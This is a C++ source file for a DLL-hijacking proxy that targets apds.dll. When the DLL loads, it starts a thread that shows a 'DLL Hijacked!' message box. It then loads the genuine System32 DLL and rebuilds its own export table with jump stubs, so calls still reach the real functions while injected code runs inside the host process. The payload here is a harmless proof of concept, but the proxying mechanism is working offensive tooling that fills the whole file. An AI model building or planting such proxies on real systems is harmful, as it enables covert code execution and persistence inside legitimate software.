#pragma once
#include <Windows.h>



// Function executed when the thread starts
extern "C" __declspec(dllexport)
DWORD WINAPI MessageBoxThread(LPVOID lpParam) {
    MessageBox(NULL, L"DLL Hijacked!", L"DLL Hijacked!", NULL);
    return 0;
}

PBYTE AllocateUsableMemory(PBYTE baseAddress, DWORD size, DWORD protection = PAGE_READWRITE) {
#ifdef _WIN64
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER optionalHeader = &ntHeaders->OptionalHeader;

    // Create some breathing room
    baseAddress = baseAddress + optionalHeader->SizeOfImage;

    for (PBYTE offset = baseAddress; offset < baseAddress + MAXDWORD; offset += 1024 * 8) {
        PBYTE usuable = (PBYTE)VirtualAlloc(
            offset,
            size,
            MEM_RESERVE | MEM_COMMIT,
            protection);

        if (usuable) {
            ZeroMemory(usuable, size); // Not sure if this is required
            return usuable;
        }
    }
#else
    // x86 doesn't matter where we allocate

    PBYTE usuable = (PBYTE)VirtualAlloc(
        NULL,
        size,
        MEM_RESERVE | MEM_COMMIT,
        protection);

    if (usuable) {
        ZeroMemory(usuable, size);
        return usuable;
    }
#endif
    return 0;
}

BOOL ProxyExports(HMODULE ourBase, HMODULE targetBase)
{
#ifdef _WIN64
    BYTE jmpPrefix[] = { 0x48, 0xb8 }; // Mov Rax <Addr>
    BYTE jmpSuffix[] = { 0xff, 0xe0 }; // Jmp Rax
#else
    BYTE jmpPrefix[] = { 0xb8 }; // Mov Eax <Addr>
    BYTE jmpSuffix[] = { 0xff, 0xe0 }; // Jmp Eax
#endif

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER optionalHeader = &ntHeaders->OptionalHeader;
    PIMAGE_DATA_DIRECTORY exportDataDirectory = &optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDataDirectory->Size == 0)
        return FALSE; // Nothing to forward

    PIMAGE_EXPORT_DIRECTORY targetExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosHeader + exportDataDirectory->VirtualAddress);

    if (targetExportDirectory->NumberOfFunctions != targetExportDirectory->NumberOfNames)
        return FALSE; // TODO: Add support for DLLs with mixed ordinals

    dosHeader = (PIMAGE_DOS_HEADER)ourBase;
    ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);
    optionalHeader = &ntHeaders->OptionalHeader;
    exportDataDirectory = &optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDataDirectory->Size == 0)
        return FALSE; // Our DLL is broken

    PIMAGE_EXPORT_DIRECTORY ourExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosHeader + exportDataDirectory->VirtualAddress);

    // ----------------------------------

    // Make current header data RW for redirections
    DWORD oldProtect = 0;
    if (!VirtualProtect(
        ourExportDirectory,
        64, PAGE_READWRITE,
        &oldProtect)) {
        return FALSE;
    }

    DWORD totalAllocationSize = 0;

    // Add the size of jumps
    totalAllocationSize += targetExportDirectory->NumberOfFunctions * (sizeof(jmpPrefix) + sizeof(jmpSuffix) + sizeof(LPVOID));

    // Add the size of function table
    totalAllocationSize += targetExportDirectory->NumberOfFunctions * sizeof(INT);

    // Add total size of names
    PINT targetAddressOfNames = (PINT)((PBYTE)targetBase + targetExportDirectory->AddressOfNames);
    for (DWORD i = 0; i < targetExportDirectory->NumberOfNames; i++)
        totalAllocationSize += (DWORD)strlen(((LPCSTR)((PBYTE)targetBase + targetAddressOfNames[i]))) + 1;

    // Add size of name table
    totalAllocationSize += targetExportDirectory->NumberOfNames * sizeof(INT);

    // Add the size of ordinals:
    totalAllocationSize += targetExportDirectory->NumberOfFunctions * sizeof(USHORT);

    // Allocate usuable memory for rebuilt export data
    PBYTE exportData = AllocateUsableMemory((PBYTE)ourBase, totalAllocationSize, PAGE_READWRITE);
    if (!exportData)
        return FALSE;

    PBYTE sideAllocation = exportData; // Used for VirtualProtect later

    // Copy Function Table
    PINT newFunctionTable = (PINT)exportData;
    CopyMemory(newFunctionTable, (PBYTE)targetBase + targetExportDirectory->AddressOfNames, targetExportDirectory->NumberOfFunctions * sizeof(INT));
    exportData += targetExportDirectory->NumberOfFunctions * sizeof(INT);
    ourExportDirectory->AddressOfFunctions = (DWORD)((PBYTE)newFunctionTable - (PBYTE)ourBase);

    // Write JMPs and update RVAs in the new function table
    PINT targetAddressOfFunctions = (PINT)((PBYTE)targetBase + targetExportDirectory->AddressOfFunctions);
    for (DWORD i = 0; i < targetExportDirectory->NumberOfFunctions; i++) {
        newFunctionTable[i] = (DWORD)(exportData - (PBYTE)ourBase);

        CopyMemory(exportData, jmpPrefix, sizeof(jmpPrefix));
        exportData += sizeof(jmpPrefix);

        PBYTE realAddress = (PBYTE)((PBYTE)targetBase + targetAddressOfFunctions[i]);
        CopyMemory(exportData, &realAddress, sizeof(LPVOID));
        exportData += sizeof(LPVOID);

        CopyMemory(exportData, jmpSuffix, sizeof(jmpSuffix));
        exportData += sizeof(jmpSuffix);
    }

    // Copy Name RVA Table
    PINT newNameTable = (PINT)exportData;
    CopyMemory(newNameTable, (PBYTE)targetBase + targetExportDirectory->AddressOfNames, targetExportDirectory->NumberOfNames * sizeof(DWORD));
    exportData += targetExportDirectory->NumberOfNames * sizeof(DWORD);
    ourExportDirectory->AddressOfNames = (DWORD)((PBYTE)newNameTable - (PBYTE)ourBase);

    // Copy names and apply delta to all the RVAs in the new name table
    for (DWORD i = 0; i < targetExportDirectory->NumberOfNames; i++) {
        PBYTE realAddress = (PBYTE)((PBYTE)targetBase + targetAddressOfNames[i]);
        DWORD length = (DWORD)strlen((LPCSTR)realAddress);
        CopyMemory(exportData, realAddress, length);
        newNameTable[i] = (DWORD)((PBYTE)exportData - (PBYTE)ourBase);
        exportData += length + 1;
    }

    // Copy Ordinal Table
    PINT newOrdinalTable = (PINT)exportData;
    CopyMemory(newOrdinalTable, (PBYTE)targetBase + targetExportDirectory->AddressOfNameOrdinals, targetExportDirectory->NumberOfFunctions * sizeof(USHORT));
    exportData += targetExportDirectory->NumberOfFunctions * sizeof(USHORT);
    ourExportDirectory->AddressOfNameOrdinals = (DWORD)((PBYTE)newOrdinalTable - (PBYTE)ourBase);

    // Set our counts straight
    ourExportDirectory->NumberOfFunctions = targetExportDirectory->NumberOfFunctions;
    ourExportDirectory->NumberOfNames = targetExportDirectory->NumberOfNames;

    if (!VirtualProtect(
        ourExportDirectory,
        64, oldProtect,
        &oldProtect)) {
        return FALSE;
    }

    if (!VirtualProtect(
        sideAllocation,
        totalAllocationSize,
        PAGE_EXECUTE_READ,
        &oldProtect)) {
        return FALSE;
    }

    return TRUE;
}
// Executed when the DLL is loaded (traditionally or through reflective injection)
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    HMODULE realDLL;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL, NULL);
        realDLL = LoadLibrary(L"C:\\Windows\\System32\\apds.dll");
        if (realDLL)
            ProxyExports(hModule, realDLL);


    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
